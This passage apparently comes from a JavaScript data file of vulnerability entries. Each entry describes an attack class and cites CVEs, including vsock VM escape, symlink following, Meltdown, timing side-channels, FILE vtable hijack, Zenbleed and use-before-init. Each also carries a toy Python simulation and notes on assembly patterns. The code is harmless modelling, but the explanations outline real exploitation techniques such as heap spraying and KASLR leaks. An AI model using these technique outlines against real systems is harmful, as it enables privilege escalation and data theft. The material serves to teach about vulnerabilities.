      'the capacity, cmpl in write_stale still checks against the cached old_cap — the subsequent movl writes ' +
      'past the new boundary into the adjacent_meta field, corrupting heap metadata for arbitrary code execution.',
    code:
`# CVE pattern: realloc shrinks buffer — stale pointer writes past new boundary
class Buffer:
    def __init__(self, capacity):
        self.capacity = capacity
        self.data0 = 0
        self.data1 = 0
        self.data2 = 0
        self.adjacent_meta = 4196352

    def fill(self, v0, v1, v2):
        self.data0 = v0
        self.data1 = v1
        self.data2 = v2
        return self.capacity

    def realloc_shrink(self, new_cap):
        self.capacity = new_cap
        if new_cap < 3:
            self.data2 = 0
        if new_cap < 2:
            self.data1 = 0
        return self.capacity

class StaleWriter:
    def __init__(self, old_cap):
        self.old_cap = old_cap
        self.written = 0

    def write_stale(self, buf, index, value):
        if index < self.old_cap:
            if index == 0:
                buf.data0 = value
            elif index == 1:
                buf.data1 = value
            elif index == 2:
                buf.data2 = value
            else:
                buf.adjacent_meta = value
            self.written += 1
        return self.written

buf = Buffer(4)
buf.fill(100, 200, 300)
buf.realloc_shrink(2)
stale = StaleWriter(4)
stale.write_stale(buf, 2, 3735928559)
stale.write_stale(buf, 3, 1094795585)
leaked = buf.adjacent_meta
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl'],
      description: 'cmpl in write_stale checks the index against the cached old_cap (4) instead of the post-realloc capacity (2); movl then writes 0xDEADBEEF into the data2 slot that realloc freed and 0x41414141 into adjacent_meta — the stale capacity bound lets both writes proceed, corrupting heap metadata past the shrunk buffer boundary',
    },
  },
  {
    id: 'vsock-vm-escape',
    name: 'VSOCK VM ESCAPE',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Transport reassignment in the vsock subsystem incorrectly decrements the socket refcount, freeing it while dangling references remain — enabling VM-to-host privilege escalation.',
    explanation:
      'Vsock transport use-after-free (CWE-416 / CWE-911) exploits a refcount lifecycle mismatch in the Linux ' +
      'kernel\'s vsock (virtual socket) subsystem — the IPC mechanism connecting guests to their hypervisor host. ' +
      'When a vsock connection attempt fails (e.g. targeting a non-existent CID), the transport is released via ' +
      'transport->release(), which calls vsock_remove_bound() without verifying the socket was ever moved to the ' +
      'bound list — decrementing the refcount from 2 to 1. A subsequent vsock_bind() call assumes the socket is ' +
      'still in the unbound list and calls __vsock_remove_bound() again, dropping the refcount to zero and freeing ' +
      'the socket while the process still holds a file descriptor referencing it. ' +
      'CVE-2025-21756 ("Attack of the Vsock", CVSS 7.8) demonstrated this exact primitive: the attacker triggers ' +
      'the double-decrement from inside a guest VM, reclaims the freed socket\'s memory with pipe backing pages ' +
      '(using the same cross-cache technique as CVE-2024-0582), then overwrites the host kernel\'s cred struct ' +
      'uid/gid to zero — escaping the VM and achieving root on the host. The exploit uses vsock_diag_dump() as a ' +
      'side channel to leak init_net\'s address, defeating KASLR, and bypasses AppArmor by targeting functions not ' +
      'covered by LSM hooks. The vulnerability existed in every kernel from 5.5 through 6.13.3, affecting QEMU/KVM, ' +
      'VMware, and cloud workloads. ' +
      'In the assembly, two separate movl instructions decrement the refcount field — the second decrement\'s cmpl ' +
      'sees refcount == 0 and movl zeroes the socket fields (simulating free); the subsequent invoke\'s addl reads ' +
      'from the same stack offset where the attacker has reclaimed the memory with controlled data via pipe page ' +
      'spraying, crossing the VM isolation boundary.',
    code:
`# CVE pattern: vsock transport rebind drops refcount — UAF crosses VM boundary
class VsockSocket:
    def __init__(self, cid, port):
        self.cid = cid
        self.port = port
        self.refcount = 2
        self.transport = 1
        self.freed = 0

    def transport_release(self):
        self.refcount -= 1
        self.transport = 0
        return self.refcount

    def rebind_remove(self):
        self.refcount -= 1
        if self.refcount == 0:
            self.freed = 1
            self.cid = 0
            self.port = 0
        return self.freed

    def invoke(self):
        result = self.cid + self.port
        return result

class VMHost:
    def __init__(self, kernel_base):
        self.kernel_base = kernel_base
        self.cred_uid = 1000
        self.escaped = 0

    def reclaim_freed(self, payload):
        self.cred_uid = payload
        self.escaped = 1
        return self.escaped

sock = VsockSocket(3, 9999)
sock.transport_release()
sock.rebind_remove()
host = VMHost(4196352)
host.reclaim_freed(0)
sock.cid = 3735928559
sock.port = 4196608
leaked = sock.invoke()
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'movl decrements refcount twice via transport_release and rebind_remove; cmpl in rebind_remove sees refcount == 0 and movl zeroes the socket fields (simulating free) — but invoke\'s addl reads from the same stack offset where the attacker has reclaimed memory with 0xDEADBEEF via pipe page spraying, crossing the VM isolation boundary to achieve host-level code execution',
    },
  },
  {
    id: 'symlink-following',
    name: 'SYMLINK FOLLOWING',
    severity: 'CRITICAL',
    category: 'Race Condition',
    description: 'Privileged process follows an attacker-planted symlink, redirecting file operations to sensitive targets like /etc/shadow for arbitrary overwrite.',
    explanation:
      'Symlink following (CWE-59) occurs when a privileged process — a setuid binary, root daemon, or system ' +
      'service — performs a file operation on a path without verifying whether it has been replaced by a symbolic ' +
      'link. The attacker creates or replaces a file in a world-writable directory (typically /tmp) with a symlink ' +
      'pointing to a sensitive target such as /etc/shadow, /etc/passwd, or SSH host keys. When the privileged ' +
      'process opens, writes, or changes permissions on the path, the kernel resolves the symlink transparently ' +
      'and the operation lands on the attacker\'s chosen target with the process\'s elevated privileges. ' +
      'CVE-2021-44731 (snap-confine, CVSS 7.8) exploited a race in setup_private_mount() — the function passed ' +
      'an absolute path to mount() which follows symlinks, allowing an attacker to replace /tmp/snap.$SNAP_NAME ' +
      'with a directory containing a symlink named "tmp", achieving root on Ubuntu via bind-mount redirection. ' +
      'CVE-2026-3888 (snap-confine + systemd-tmpfiles) showed the same class persists: when systemd-tmpfiles ' +
      'cleaned the snap private /tmp directory after 10–30 days, an attacker could re-create it with malicious ' +
      'symlinks, achieving root on Ubuntu Desktop 24.04+. CVE-2023-38175 (Windows Defender) redirected privileged ' +
      'antivirus file operations via a planted symlink for local privilege escalation. The O_NOFOLLOW flag and ' +
      'the protected_symlinks sysctl (Linux 3.6+) mitigate the class, but many legacy and containerized ' +
      'applications still follow symlinks unconditionally. ' +
      'In the assembly, movl stores the original tmpfile path reference; replace_with_link\'s movl sets is_link=1 ' +
      'and stores the /etc/shadow address in link_target; cmpl in resolve() checks is_link and the branch returns ' +
      'link_target instead of the original path — write_config\'s addl combines the redirected target with the ' +
      'payload, landing the privileged write on /etc/shadow without any symlink validation between path resolution ' +
      'and the write operation.',
    code:
`# CVE pattern: setuid process follows symlink — writes to /etc/shadow
class FileNode:
    def __init__(self, inode, data, owner):
        self.inode = inode
        self.data = data
        self.owner = owner
        self.link_target = 0
        self.is_link = 0

    def replace_with_link(self, target_data):
        self.link_target = target_data
        self.is_link = 1
        return self.is_link

    def resolve(self):
        if self.is_link == 1:
            result = self.link_target
        else:
            result = self.data
        return result

class SetuidService:
    def __init__(self, real_uid, eff_uid):
        self.real_uid = real_uid
        self.eff_uid = eff_uid
        self.written = 0

    def write_config(self, node, payload):
        target = node.resolve()
        result = target + payload
        self.written = 1
        return result

class ShadowFile:
    def __init__(self, hash_val):
        self.hash_val = hash_val
        self.corrupted = 0

    def read(self):
        result = self.hash_val + self.corrupted
        return result

shadow = ShadowFile(4196352)
tmpfile = FileNode(1001, 42, 1000)
service = SetuidService(1000, 0)
tmpfile.replace_with_link(shadow.hash_val)
shadow.hash_val = service.write_config(tmpfile, 3735928559)
shadow.corrupted = 1
leaked = shadow.read()
print(leaked)
`,
    badAsm: {
      patterns: ['cmpl', 'movl', 'addl'],
      description: 'movl stores the original tmpfile data; replace_with_link\'s movl overwrites link_target with the /etc/shadow address and sets is_link=1; cmpl in resolve() checks is_link and the branch returns link_target instead of the original path — write_config\'s addl combines the redirected target with the attacker payload (0xDEADBEEF), landing the privileged write on /etc/shadow without any symlink validation or O_NOFOLLOW guard',
    },
  },
  {
    id: 'meltdown-ooo',
    name: 'MELTDOWN OOO READ',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'CPU out-of-order execution reads kernel memory before a permission fault is delivered, leaking secrets via cache timing side-channel.',
    explanation:
      'Meltdown (CVE-2017-5754 / CWE-200), also called Rogue Data Cache Load, exploits out-of-order execution ' +
      'in Intel and some ARM CPUs. When a user-mode load targets a kernel address, the CPU raises a fault — but ' +
      'the micro-op scheduler has already dispatched dependent instructions using the speculatively loaded value ' +
      'before the fault retires. The transient instructions use the kernel byte to index a 256-entry probe array ' +
      '(multiplied by cache-line size), loading exactly one cache line. After the fault is delivered and the ' +
      'transient results are architecturally squashed, the cache state persists — a Flush+Reload timing measurement ' +
      'reveals which line was loaded, recovering the secret byte. Repeating across every address dumps the entire ' +
      'kernel address space — /etc/shadow hashes, cryptographic keys, other processes\' memory — at up to 503 KB/s. ' +
      'CVE-2017-5754 affected virtually every Intel CPU manufactured from 1995 to 2018 and ARM Cortex-A75. The ' +
      'kernel Page Table Isolation (KPTI/KAISER) mitigation unmaps kernel pages from user-space page tables ' +
      'entirely, imposing 5-30% performance overhead. CVE-2018-3615 (Foreshadow/L1TF) extended the attack to SGX ' +
      'enclave memory, breaking cloud tenant isolation. CVE-2024-45332 (Branch Privilege Injection, ETH Zurich, ' +
      'USENIX Security 2025) showed that Intel\'s own eIBRS/IBPB hardware mitigations could be bypassed via a ' +
      'branch predictor race condition, leaking kernel memory at 5.6 KB/s on all Intel CPUs since 9th-gen Coffee Lake. ' +
      'Unlike Spectre (which exploits branch prediction), Meltdown exploits the CPU\'s failure to enforce privilege ' +
      'checks before forwarding data from the L1 data cache to dependent transient instructions. ' +
      'In the assembly, cmpl checks the supervisor ring level but the CPU\'s out-of-order pipeline has already ' +
      'dispatched the movl that loads the kernel secret; imull multiplies the transient value by 256 to compute ' +
      'the probe array cache-line index — no lfence serializing instruction appears between the permission check ' +
      'and the dependent load, so the cache side-channel encodes the secret before the fault squashes the result.',
    code:
`# CVE pattern: out-of-order exec reads kernel page before fault delivery
class KernelPage:
    def __init__(self, secret, flags):
        self.secret = secret
        self.flags = flags
        self.supervisor = 1
        self.cached = 0

    def check_ring(self, ring):
        if ring == 0:
            self.cached = self.secret
        else:
            self.cached = 0
        return self.cached

class ProbeArray:
    def __init__(self, lines):
        self.lines = lines
        self.hot_index = 0
        self.timing = 0
        self.recovered = 0

    def transient_load(self, secret_val):
        self.hot_index = secret_val * 256
        self.timing = 1
        return self.hot_index

    def flush_reload(self):
        self.recovered = self.hot_index + self.timing
        return self.recovered

kpage = KernelPage(3405691582, 7)
probe = ProbeArray(256)
kpage.check_ring(3)
leaked = probe.transient_load(kpage.secret)
result = probe.flush_reload()
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'imull'],
      description: 'cmpl checks the ring level (user-mode ring 3 vs kernel ring 0) and the branch sets cached=0 — but the CPU\'s out-of-order pipeline has already dispatched movl to load kpage.secret from the L1 cache; imull multiplies the transient value by 256 to index the probe array, loading a specific cache line — no lfence appears between the check and the dependent load, so the Flush+Reload side-channel recovers the kernel secret after the fault squashes the architectural result',
    },
  },
  {
    id: 'timing-side-channel',
    name: 'TIMING SIDE-CHANNEL',
    severity: 'CRITICAL',
    category: 'Cryptographic',
    description: 'Non-constant-time comparison of secret tokens leaks byte-by-byte timing differences, letting an attacker recover HMAC keys, session tokens, or signing MACs remotely.',
    explanation:
      'Timing side-channel attacks (CWE-208) exploit the fact that standard comparison functions — memcmp(), ' +
      'strcmp(), == — terminate early on the first mismatched byte. When used to verify a cryptographic MAC, HMAC, ' +
      'or session token, the response time reveals how many leading bytes of the attacker\'s guess matched the ' +
      'secret: a guess that fails on byte 0 returns faster than one that fails on byte 10. By measuring response ' +
      'latency across 256 candidates per position, the attacker recovers the full secret one byte at a time — ' +
      'reducing a 2^128 brute-force to 256×16 = 4,096 guesses for a 16-byte HMAC. ' +
      'CVE-2026-23364 (Linux ksmbd, CVSS 8.1) used memcmp() instead of crypto_memneq() when verifying SMB3 ' +
      'signing MACs, allowing network-adjacent attackers to forge signed SMB packets and achieve RCE on kernel ' +
      'file-sharing servers. CVE-2026-21713 (Node.js Web Cryptography API) verified HMAC and KMAC digests with ' +
      'non-constant-time memcmp, enabling remote timing attacks against any application using subtle.verify(). ' +
      'CVE-2022-4304 (OpenSSL RSA, CVSS 5.9) leaked RSA plaintext via a timing oracle in PKCS#1 v1.5 decryption — ' +
      'a Bleichenbacher-style attack exploitable across TLS connections. The fix in every case is identical: ' +
      'replace early-exit comparison with a constant-time function (CRYPTO_memcmp, hmac.compare_digest, ' +
      'crypto_memneq) that always examines every byte regardless of mismatch position. ' +
      'In the assembly, the chain of cmpl + jne instructions forms a cascade where each byte comparison branches ' +
      'out immediately on mismatch — the attacker measures which cmpl was the last to execute before the return, ' +
      'recovering the secret byte at that position. A constant-time implementation would replace the cascade with ' +
      'a single xorl accumulator loop that never branches on individual byte results.',
    code:
`# CVE pattern: non-constant-time MAC verify leaks secret byte-by-byte
class SecureToken:
    def __init__(self, b0, b1, b2, b3):
        self.b0 = b0
        self.b1 = b1
        self.b2 = b2
        self.b3 = b3
        self.verified = 0

    def verify(self, g0, g1, g2, g3):
        if g0 != self.b0:
            return 1
        if g1 != self.b1:
            return 2
        if g2 != self.b2:
            return 3
        if g3 != self.b3:
            return 4
        self.verified = 1
        return 0

class TimingOracle:
    def __init__(self):
        self.attempts = 0
        self.last_exit = 0
        self.recovered = 0

    def probe(self, token, g0, g1, g2, g3):
        self.last_exit = token.verify(g0, g1, g2, g3)
        self.attempts += 1
        return self.last_exit

    def check_progress(self, prev, curr):
        if curr > prev:
            self.recovered += 1
        return self.recovered

token = SecureToken(222, 173, 190, 239)
oracle = TimingOracle()
e1 = oracle.probe(token, 0, 0, 0, 0)
e2 = oracle.probe(token, 222, 0, 0, 0)
e3 = oracle.probe(token, 222, 173, 0, 0)
e4 = oracle.probe(token, 222, 173, 190, 0)
oracle.check_progress(e1, e2)
oracle.check_progress(e2, e3)
oracle.check_progress(e3, e4)
result = oracle.recovered + oracle.attempts
print(result)
`,
    badAsm: {
      patterns: ['cmpl', 'jne'],
      description: 'Each cmpl compares one byte of the guess against the secret and jne branches out immediately on mismatch — the cascade of cmpl+jne instructions forms an early-exit chain where the attacker measures which comparison was the last to execute before return, recovering the secret byte at that position; a constant-time fix replaces this with a single xorl accumulator that never branches on individual byte results',
    },
  },
  {
    id: 'fsop-vtable',
    name: 'FILE STREAM ORIENTED PROGRAMMING',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Corrupted FILE structure vtable redirects I/O operations to attacker-controlled code on fclose or fflush.',
    explanation:
      'File Stream Oriented Programming (FSOP, CWE-416/CWE-122 adjacent) exploits the glibc _IO_FILE_plus ' +
      'structure, which stores buffer pointers, flags, and a vtable — a table of function pointers for I/O ' +
      'operations like read, write, and close. When a heap overflow or use-after-free corrupts a FILE object ' +
      'on the heap, the attacker overwrites the vtable pointer to reference a fake vtable containing shellcode ' +
      'addresses. The next I/O operation (fclose, fflush, or even exit() which flushes all streams) invokes ' +
      'the corrupted function pointer, redirecting execution to attacker-controlled code. ' +
      'CVE-2024-2961 (glibc iconv buffer overflow, CVSS 8.8) exploited a 24-year-old glibc bug via FILE ' +
      'structure corruption to achieve remote code execution in PHP — the exploit overwrote function pointers ' +
      'in the FILE object to call system(). CVE-2023-6246 (glibc __vsyslog_internal heap overflow) allowed ' +
      'local privilege escalation to root through heap corruption reaching FILE structures. ' +
      'Glibc 2.24 introduced IO_validate_vtable to restrict vtable pointers to the __libc_IO_vtables section, ' +
      'but researchers demonstrated bypasses via vtable misalignment — shifting the pointer within the valid ' +
      'range to invoke different function slots with attacker-controlled arguments. ' +
      'In the assembly, movl stores the legitimate vtable address during IOFile construction; the corrupt_stream ' +
      'call overwrites that slot with 0xDEADBEEF via another movl, and the subsequent close() method\'s addl ' +
      'uses the corrupted vtable value directly — on a real system, this becomes an indirect call through a ' +
      'fake vtable to attacker shellcode.',
    code:
`# CVE pattern: corrupted FILE vtable redirects fclose to attacker shellcode
class IOFile:
    def __init__(self, fd, buf_base, buf_end):
        self.fd = fd
        self.buf_base = buf_base
        self.buf_end = buf_end
        self.vtable = 4196352
        self.flags = 4222427272
        self.write_ptr = buf_base

    def write(self, size):
        self.write_ptr += size
        if self.write_ptr > self.buf_end:
            self.write_ptr = self.buf_end
        return self.write_ptr

    def close(self):
        result = self.vtable + self.fd
        self.flags = 0
        return result

class Attacker:
    def __init__(self):
        self.target = 0
        self.hijacked = 0

    def corrupt_stream(self, stream, fake_vtable):
        stream.vtable = fake_vtable
        stream.buf_base = 0
        stream.buf_end = 0
        self.target = fake_vtable
        return self.target

    def trigger_close(self, stream):
        result = stream.close()
        self.hijacked = 1
        return result

f = IOFile(3, 8192, 16384)
f.write(4096)
attacker = Attacker()
attacker.corrupt_stream(f, 3735928559)
hijacked = attacker.trigger_close(f)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the legitimate vtable address (0x400800) into the IOFile stack slot during construction; corrupt_stream\'s movl overwrites it with 0xDEADBEEF — close()\'s addl then computes a jump target from the corrupted vtable, which on a real system becomes an indirect call through a fake vtable to attacker shellcode',
    },
  },
  {
    id: 'uninit-callback',
    name: 'UNINITIALIZED CALLBACK',
    severity: 'CRITICAL',
    category: 'Code Execution',
    description: 'Partially initialized callback table invokes a stale function pointer left on the stack by a prior frame, jumping to attacker-sprayed shellcode.',
    explanation:
      'Uninitialized callback pointers (CWE-824) arise when a driver or kernel module allocates an operations ' +
      'structure but only populates some of its function pointer fields — the rest retain whatever stale values ' +
      'occupy that memory from a prior stack frame or heap allocation. When the program later invokes one of the ' +
      'uninitialized callbacks (e.g. calling a .close handler that was never set), execution jumps to the garbage ' +
      'address left in that slot. An attacker who can spray the stack or heap with controlled values before the ' +
      'allocation ensures the stale slot contains a shellcode or ROP gadget address. ' +
      'CVE-2025-23352 (NVIDIA Virtual GPU Manager, CVSS 7.8) exposed an uninitialized pointer in the vGPU guest ' +
      'interface: a malicious guest VM sent crafted GPU commands that triggered a code path where a pointer variable ' +
      'was accessed before being initialized, enabling code execution and privilege escalation on the hypervisor host ' +
      'without user interaction. CVE-2009-3620 (Linux ATI Radeon r128 KMS driver) allowed local users to dereference ' +
      'an uninitialized function pointer via a crafted ioctl because the driver failed to check whether the Concurrent ' +
      'Command Engine state was initialized before dispatching operations. ' +
      'Unlike NULL pointer dereference (where the pointer is explicitly 0x0 and requires mapping page zero), ' +
      'uninitialized callbacks contain arbitrary stale data — making exploitation more reliable when paired with ' +
      'deterministic stack spraying, since the attacker controls the exact value without needing to bypass mmap_min_addr. ' +
      'In the assembly, movl stores the stale shellcode address (0xDEADBEEF) into the close_fn stack slot during ' +
      'construction; partial_init\'s movl only touches read_fn and write_fn, leaving close_fn untouched — ' +
      'invoke_close\'s addl then operates on the stale value, which in a real system becomes an indirect call ' +
      'to attacker-controlled code.',
    code:
`# CVE pattern: ops table partially init — stale handler jumps to sprayed addr
class DriverOps:
    def __init__(self, total_ops):
        self.total_ops = total_ops
        self.read_fn = 0
        self.write_fn = 0
        self.close_fn = 3735928559
        self.ioctl_fn = 4196352
        self.init_count = 0

    def partial_init(self, read_addr, write_addr):
        self.read_fn = read_addr
        self.write_fn = write_addr
        self.init_count = 2
        return self.init_count

    def invoke_close(self):
        result = self.close_fn + self.ioctl_fn
        return result

class StackSpray:
    def __init__(self, payload):
        self.payload = payload
        self.spray_count = 0

    def fill(self, count):
        i = 0
        while i < count:
            self.spray_count += 1
            i += 1
        return self.payload * self.spray_count

spray = StackSpray(3735928559)
spray.fill(4)
ops = DriverOps(4)
ops.partial_init(4196352, 4196608)
hijacked = ops.invoke_close()
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the stale shellcode address (0xDEADBEEF) into the close_fn stack slot during construction; partial_init\'s movl only writes to read_fn and write_fn slots — invoke_close\'s addl sums the stale close_fn and ioctl_fn values, which in a real driver becomes an indirect call through a garbage function pointer to attacker-sprayed code',
    },
  },
  {
    id: 'timer-callback-uaf',
    name: 'TIMER CALLBACK UAF',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Kernel timer fires after its owning object is freed, executing a callback that dereferences attacker-controlled data in the recycled memory slot.',
    explanation:
      'Timer callback use-after-free (CWE-416 / CWE-672) occurs when a kernel object has an associated timer or ' +
      'delayed-work callback that is not properly cancelled before the object is freed. The timer subsystem holds ' +
      'a reference to the object, but this reference is invisible to the object\'s lifecycle — when the owning code ' +
      'calls kfree(), the timer wheel still holds a stale pointer. Milliseconds later, the timer fires and its ' +
      'callback dereferences the freed slot. If an attacker heap-sprays the freed memory with controlled data before ' +
      'the callback runs, the callback operates on attacker-chosen values — typically corrupting a function pointer ' +
      'or dispatching through an attacker-supplied vtable for arbitrary code execution. The asynchronous, time-delayed ' +
      'nature makes this class uniquely dangerous: the free and use happen in different execution contexts (process vs ' +
      'softirq/workqueue), making the race window wide and deterministic without tight timing requirements. ' +
      'CVE-2021-0920 (Linux AF_UNIX garbage collection, CVSS 6.4) was exploited in the wild on Android devices: ' +
      'a race between close() and the AF_UNIX garbage collector\'s deferred reclaim allowed a UAF on socket inflight ' +
      'file descriptors — the freed socket structure was reclaimed by a heap spray, and the garbage collector\'s ' +
      'callback operated on attacker-controlled data for kernel code execution. Google TAG confirmed active exploitation ' +
      'targeting Android as an in-the-wild zero-day. CVE-2024-1085 (netfilter nf_tables, CVSS 7.8) triggered when the ' +
      'nft_setelem_catchall_deactivate() function freed a catch-all set element that was still referenced by the next ' +
      'generation — the deferred cleanup callback fired on the freed element, enabling unprivileged local privilege ' +
      'escalation to root on kernels 5.13 through 6.7. CVE-2022-0995 (Linux watch_queue, CVSS 7.8) exposed the ' +
      'same pattern: a notification filter\'s cleanup work raced with pipe destruction, yielding kernel code ' +
      'execution from unprivileged user namespaces. ' +
      'In the assembly, movl stores the handler and data into TimerObj stack slots; destroy\'s movl zeroes them ' +
      '(simulating kfree); the sprayer\'s movl writes 0xDEADBEEF into those same offsets before the timer fires — ' +
      'fire_callback\'s addl sums the attacker-controlled handler and data, which in a real kernel becomes an indirect ' +
      'call through a corrupted function pointer to attacker-sprayed code.',
    code:
`# CVE pattern: timer fires after kfree — callback hits attacker-sprayed slot
class TimerObj:
    def __init__(self, handler, interval):
        self.handler = handler
        self.interval = interval
        self.data = 0
        self.freed = 0

    def arm(self, callback_data):
        self.data = callback_data
        return self.data

    def destroy(self):
        self.handler = 0
        self.data = 0
        self.freed = 1
        return self.freed

class TimerWheel:
    def __init__(self, capacity):
        self.capacity = capacity
        self.pending = 0
        self.fired = 0

    def schedule(self, obj):
        self.pending += 1
        return self.pending

    def fire_callback(self, obj):
        result = obj.handler + obj.data
        self.fired += 1
        return result

class HeapSprayer:
    def __init__(self, payload):
        self.payload = payload
        self.count = 0

    def spray(self, target, rounds):
        i = 0
        while i < rounds:
            self.count += 1
            i += 1
        target.handler = self.payload
        target.data = self.payload
        return self.count

timer_obj = TimerObj(4196352, 100)
timer_obj.arm(256)
wheel = TimerWheel(64)
wheel.schedule(timer_obj)
timer_obj.destroy()
sprayer = HeapSprayer(3735928559)
sprayer.spray(timer_obj, 4)
hijacked = wheel.fire_callback(timer_obj)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the original handler and data into TimerObj stack slots; destroy\'s movl zeroes them (simulating kfree) but the timer wheel retains a stale reference — the sprayer\'s movl overwrites the freed slots with 0xDEADBEEF before fire_callback\'s addl sums the attacker-controlled values, which in a real kernel becomes an indirect call through a corrupted function pointer in the recycled memory slot',
    },
  },
  {
    id: 'zenbleed-regfile',
    name: 'ZENBLEED REGISTER LEAK',
    severity: 'CRITICAL',
    category: 'Information Disclosure',
    description: 'Speculative vzeroupper rollback fails to restore register state, leaking cross-process data from the shared CPU register file.',
    explanation:
      'Zenbleed (CVE-2023-20593 / CWE-1303) exploits a microarchitectural bug in AMD Zen 2 processors: the ' +
      'vzeroupper instruction zeroes the upper 128 bits of YMM registers to optimize AVX-to-SSE transitions. ' +
      'When vzeroupper is speculatively executed but the branch mispredicts and rolls back, the Zen 2 register ' +
      'rename logic fails to properly restore the register\'s prior state — the physical register entry is left ' +
      'in an undefined state containing data from a different process, thread, or virtual machine that previously ' +
      'used the same physical register. Crucially, this is not a timing attack or side-channel: the stale register ' +
      'contents can be read directly by unprivileged code at up to 30 KB per core per second — fast enough to ' +
      'capture AES keys, passwords, authentication cookies, and session tokens from any workload sharing the ' +
      'same physical core. Discovered by Tavis Ormandy of Google Project Zero in July 2023, Zenbleed affects ' +
      'all AMD Zen 2 CPUs: Ryzen 3000/4000 desktop and laptop processors, Threadripper PRO 3000, and EPYC ' +
      '"Rome" server chips deployed across AWS, Azure, and GCP. Unlike Spectre, no victim cooperation, shared ' +
      'address space, or cache probing is needed — the attacker simply polls the register file from an ' +
      'unprivileged process. The specific trigger sequence is vcvtsi2ss/vmovupd/vzeroupper, where overlapping ' +
      'XMM and YMM register dependencies cause the rollback to leave the YMM register in an undefined state. ' +
      'AMD issued microcode fix AGESA ComboAM4v2PI 1.2.0.Ca (chicken bit DE_CFG[9]) with no measurable ' +
      'performance impact, but unpatched systems remain fully exposed. ' +
      'In the assembly, movl stores the victim\'s AES key and session token into stack slots representing the ' +
      'register file; spec_vzeroupper\'s movl zeroes them but rollback\'s movl restores the stale values — ' +
      'the attacker\'s addl in sample_register sums the leaked register contents without any cache timing or ' +
      'shared memory, directly observing cross-process secrets from the physical register file.',
    code:
`# CVE pattern: vzeroupper rollback leaks stale register data cross-process
class RegisterFile:
    def __init__(self, capacity):
        self.capacity = capacity
        self.ymm0_lo = 0
        self.ymm0_hi = 0
        self.ymm1_lo = 0
        self.ymm1_hi = 0
        self.rename_valid = 1

    def load_victim_data(self, key, token):
        self.ymm0_hi = key
        self.ymm1_hi = token
        return self.ymm0_hi + self.ymm1_hi

    def spec_vzeroupper(self):
        self.ymm0_hi = 0
        self.ymm1_hi = 0
        self.rename_valid = 0
        return self.rename_valid

    def rollback(self, stale_key, stale_token):
        if self.rename_valid == 0:
            self.ymm0_hi = stale_key
            self.ymm1_hi = stale_token
            self.rename_valid = 1
        return self.rename_valid

class Attacker:
    def __init__(self, core_id):
        self.core_id = core_id
        self.leaked = 0
        self.samples = 0

    def sample_register(self, regfile):
        self.leaked = regfile.ymm0_hi + regfile.ymm1_hi
        self.samples += 1
        return self.leaked

regfile = RegisterFile(16)
aes_key = 3405691582
session_tok = 3735928559
regfile.load_victim_data(aes_key, session_tok)
regfile.spec_vzeroupper()
regfile.rollback(aes_key, session_tok)
attacker = Attacker(0)
leaked = attacker.sample_register(regfile)
print(leaked)
`,
    badAsm: {
      patterns: ['movl', 'addl'],
      description: 'movl stores the victim\'s AES key (0xCAFEBABE) and session token (0xDEADBEEF) into register-file stack slots; spec_vzeroupper\'s movl zeroes them but rollback\'s movl restores the stale values — the attacker\'s addl in sample_register sums the leaked register contents without any cache timing or shared memory, directly observing cross-process secrets from the physical register file',
    },
  },
  {
    id: 'use-before-init',
    name: 'USE-BEFORE-INITIALIZATION',
    severity: 'CRITICAL',
    category: 'Memory Corruption',
    description: 'Conditional branch skips variable initialization; attacker stack-sprays the prior frame so the uninitialized variable inherits a controlled value used as a function pointer.',
    explanation:
      'Use-before-initialization (CWE-457) occurs when a variable is declared but a conditional code path ' +
      'skips its assignment, leaving it with whatever garbage value occupies that stack slot from a prior call ' +
      'frame. Unlike uninitialized buffer reads (CWE-908), which leak stale data passively, use-before-init ' +
      'lets the attacker CONTROL the uninitialized value via targeted stack spraying: a prior syscall ' +
      'deliberately places a payload (e.g. a shellcode address) at the exact stack offset the vulnerable ' +
      'function\'s local variable will occupy. When the branch skips initialization, the variable inherits the ' +
      'sprayed value — if it\'s used as a function pointer, array index, or allocation size, the attacker gains ' +
      'code execution or arbitrary memory access. ' +
      'CVE-2025-20766 (MediaTek display subsystem, CVSS 7.8) exploited an uninitialized variable in the display ' +
      'driver to achieve local privilege escalation across 30+ chipset models without user interaction. ' +
      'CVE-2025-29952 (AMD SEV firmware) exploited CWE-457 to corrupt Reverse Map Table memory, compromising ' +
      'guest VM integrity from a privileged host context. Research presented at NDSS 2017 ("Unleashing ' +
      'Use-Before-Initialization Vulnerabilities in the Linux Kernel Using Targeted Stack Spraying") demonstrated ' +
      'that deterministic stack spraying — combining symbolic execution with guided fuzzing to identify kernel ' +
      'inputs that leave attacker-controlled data at specific stack offsets — could weaponize eight kernel ' +
      'uninitialized-variable CVEs, converting low-CVSS information leaks into reliable privilege escalation. ' +
      'In the assembly, movl loads the spray payload (0xDEADBEEF) from the StackRegion into the fn_ptr slot; ' +
      'cmpl checks cmd against 42 but when cmd==0 the conditional branch skips the safe movl that would ' +
      'overwrite fn_ptr with a legitimate address — addl then uses the stale spray value directly as a ' +
      'function pointer offset, giving the attacker deterministic code execution.',
    code:
`# CVE pattern: branch skips init — stack-sprayed value used as fn_ptr
class StackRegion:
    def __init__(self, size):
        self.size = size
        self.frame0 = 0
        self.frame1 = 0
        self.frame2 = 0
        self.sprayed = 0

    def spray_via_syscall(self, payload, rounds):
        self.frame0 = payload
        self.frame1 = payload
        self.frame2 = payload
        i = 0
        while i < rounds:
            self.sprayed += 1
            i += 1
        return self.sprayed

class VulnIoctl:
    def __init__(self, stack):
        self.fn_ptr = stack.frame0
        self.initialized = 0
        self.result = 0

    def handle(self, cmd, arg):
        if cmd == 42:
            self.fn_ptr = 4196352
            self.initialized = 1
        self.result = self.fn_ptr + arg
        return self.result

region = StackRegion(8192)
region.spray_via_syscall(3735928559, 4)
handler = VulnIoctl(region)
hijacked = handler.handle(0, 256)
print(hijacked)
`,
    badAsm: {
      patterns: ['movl', 'cmpl'],
